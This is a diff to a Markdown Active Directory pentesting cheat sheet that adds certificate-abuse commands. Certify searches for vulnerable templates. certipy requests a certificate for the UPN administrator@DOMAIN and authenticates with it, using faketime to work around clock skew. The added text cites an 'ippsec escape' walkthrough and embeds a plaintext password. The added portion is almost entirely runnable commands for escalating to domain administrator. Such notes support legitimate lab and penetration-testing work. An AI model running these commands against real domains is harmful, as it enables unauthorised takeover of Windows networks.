@@ -23,6 +23,13 @@ Get-ADTrust -Filter *
 Get-ADGroup -Filter * | select name
 Get-ADGroup -Identity "Backup Operators"
 Get-ADGroupMember -Identity "Backup Operators"
+.\Certify.exe find /vulnerable
+```
+
+When evil-winrm does not work with SSL, use Rubeus (**ippsec escape**) or certipy:
+```sh
+certipy-ad req -u USER@DOMAIN -p NuclearMosquito3 -upn administrator@DOMAIN -target DOMAIN -ca SLD-dc-ca -template UserAuthentication
+faketime "$(ntpdate -q DOMAIN | cut -d ' ' -f 1,2)" certipy-ad auth -pfx administrator.pfx -dc-ip IP
 ```
 
 ## 2. PowerView / SharpView
